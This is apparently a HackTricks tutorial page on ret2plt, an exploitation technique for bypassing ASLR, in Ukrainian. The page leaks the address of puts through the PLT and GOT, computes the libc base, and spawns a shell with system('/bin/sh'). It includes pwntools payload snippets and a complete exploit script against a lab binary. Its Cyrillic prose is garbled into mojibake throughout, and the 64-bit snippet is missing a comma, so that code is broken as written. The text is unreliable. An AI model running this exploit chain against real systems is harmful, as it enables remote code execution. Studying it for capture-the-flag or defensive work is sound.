# Ret2plt

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ –≤–∑–ª–æ–º AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ –≤–∑–ª–æ–º GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ—à–∏—Ä—é–π—Ç–µ —Ö–∞–∫–µ—Ä—Å—å–∫—ñ —Ç—Ä—é–∫–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>
{% endhint %}

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

–ú–µ—Ç–æ—é —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏ —î **–≤–∏—Ç—ñ–∫ –∞–¥—Ä–µ—Å–∏ —Ñ—É–Ω–∫—Ü—ñ—ó –∑ PLT**, —â–æ–± –æ–±—ñ–π—Ç–∏ ASLR. –¶–µ —Ç–æ–º—É, —â–æ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –≤–∏ –≤–∏—Ç—ñ–∫–∞—î—Ç–µ –∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü—ñ—ó `puts` –∑ libc, –≤–∏ –ø–æ—Ç—ñ–º –º–æ–∂–µ—Ç–µ **–æ–±—á–∏—Å–ª–∏—Ç–∏ –±–∞–∑—É `libc`** —Ç–∞ –æ–±—á–∏—Å–ª–∏—Ç–∏ –∑–º—ñ—â–µ–Ω–Ω—è –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ —ñ–Ω—à–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π, —Ç–∞–∫–∏—Ö —è–∫ **`system`**.

–¶–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–∞–∫–µ—Ç—É `pwntools`, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ ([**–∑–≤—ñ–¥—Å–∏**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —è–∫ **`puts`** (–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∞–¥—Ä–µ—Å—É –∑ PLT) –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –∑ –∞–¥—Ä–µ—Å–æ—é `puts`, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–æ—é –≤ GOT (–≥–ª–æ–±–∞–ª—å–Ω—ñ–π —Ç–∞–±–ª–∏—Ü—ñ –∑–º—ñ—â–µ–Ω—å). –¶–µ —Ç–æ–º—É, —â–æ –Ω–∞ –º–æ–º–µ–Ω—Ç, –∫–æ–ª–∏ `puts` –¥—Ä—É–∫—É—î –∑–∞–ø–∏—Å GOT `puts`, —Ü–µ–π **–∑–∞–ø–∏—Å –±—É–¥–µ –º—ñ—Å—Ç–∏—Ç–∏ —Ç–æ—á–Ω—É –∞–¥—Ä–µ—Å—É `puts` –≤ –ø–∞–º'—è—Ç—ñ**.

–¢–∞–∫–æ–∂ –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —è–∫ –∞–¥—Ä–µ—Å–∞ `main` –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ –µ–∫—Å–ø–ª–æ–π—Ç—ñ, —Ç–æ–º—É –∫–æ–ª–∏ `puts` –∑–∞–≤–µ—Ä—à—É—î —Å–≤–æ—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è, **–±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –∑–Ω–æ–≤—É –≤–∏–∫–ª–∏–∫–∞—î `main` –∑–∞–º—ñ—Å—Ç—å –≤–∏—Ö–æ–¥—É** (—Ç–∞–∫–∏–º —á–∏–Ω–æ–º –≤–∏—Ç—ñ–∫ –∞–¥—Ä–µ—Å–∏ –∑–∞–ª–∏—à–∏—Ç—å—Å—è –¥—ñ–π—Å–Ω–∏–º).

{% hint style="danger" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –¥–ª—è —Ü—å–æ–≥–æ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ **–±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –Ω–µ –º–æ–∂–µ –±—É—Ç–∏ —Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–∏–π –∑ PIE** –∞–±–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –º–∞—Ç–∏ **–≤–∏—Ç—ñ–∫ –¥–ª—è –æ–±—Ö–æ–¥—É PIE**, —â–æ–± –∑–Ω–∞—Ç–∏ –∞–¥—Ä–µ—Å—É PLT, GOT —Ç–∞ main. –í —ñ–Ω—à–æ–º—É –≤–∏–ø–∞–¥–∫—É —Å–ø–æ—á–∞—Ç–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –æ–±—ñ–π—Ç–∏ PIE.
{% endhint %}

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ [**–ø–æ–≤–Ω–∏–π –ø—Ä–∏–∫–ª–∞–¥ —Ü—å–æ–≥–æ –æ–±—Ö–æ–¥—É —Ç—É—Ç**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). –¶–µ –±—É–≤ –æ—Å—Ç–∞—Ç–æ—á–Ω–∏–π –µ–∫—Å–ø–ª–æ–π—Ç –∑ —Ç–æ–≥–æ **–ø—Ä–∏–∫–ª–∞–¥—É**:
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## –Ü–Ω—à—ñ –ø—Ä–∏–∫–ª–∞–¥–∏ —Ç–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64-–±—ñ—Ç–Ω–∞, —É–≤—ñ–º–∫–Ω–µ–Ω–∞ ASLR, –∞–ª–µ –±–µ–∑ PIE, –ø–µ—Ä—à–∏–π –∫—Ä–æ–∫ - –∑–∞–ø–æ–≤–Ω–∏—Ç–∏ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –¥–æ –±–∞–π—Ç–∞ 0x00 –∫–∞–Ω–∞—Ä–µ–π–∫–∏, –∞ –ø–æ—Ç—ñ–º –≤–∏–∫–ª–∏–∫–∞—Ç–∏ puts —ñ –≤–∏—Ç—ñ–∫–∞—Ç–∏ —ó—ó. –ó –∫–∞–Ω–∞—Ä–µ–π–∫–æ—é —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è ROP-–≥–∞–¥–∂–µ—Ç –¥–ª—è –≤–∏–∫–ª–∏–∫—É puts –¥–ª—è –≤–∏—Ç–æ–∫—É –∞–¥—Ä–µ—Å–∏ puts –∑ GOT, –∞ –ø–æ—Ç—ñ–º ROP-–≥–∞–¥–∂–µ—Ç –¥–ª—è –≤–∏–∫–ª–∏–∫—É `system('/bin/sh')`.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64-–±—ñ—Ç–Ω–∞, —É–≤—ñ–º–∫–Ω–µ–Ω–∞ ASLR, –±–µ–∑ –∫–∞–Ω–∞—Ä–µ–π–∫–∏, –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è —Å—Ç–µ–∫—É –≤ main –≤—ñ–¥ –¥–æ—á—ñ—Ä–Ω—å–æ—ó —Ñ—É–Ω–∫—Ü—ñ—ó. ROP-–≥–∞–¥–∂–µ—Ç –¥–ª—è –≤–∏–∫–ª–∏–∫—É puts –¥–ª—è –≤–∏—Ç–æ–∫—É –∞–¥—Ä–µ—Å–∏ puts –∑ GOT, –∞ –ø–æ—Ç—ñ–º –≤–∏–∫–ª–∏–∫ –æ–¥–Ω–æ–≥–æ –≥–∞–¥–∂–µ—Ç–∞.
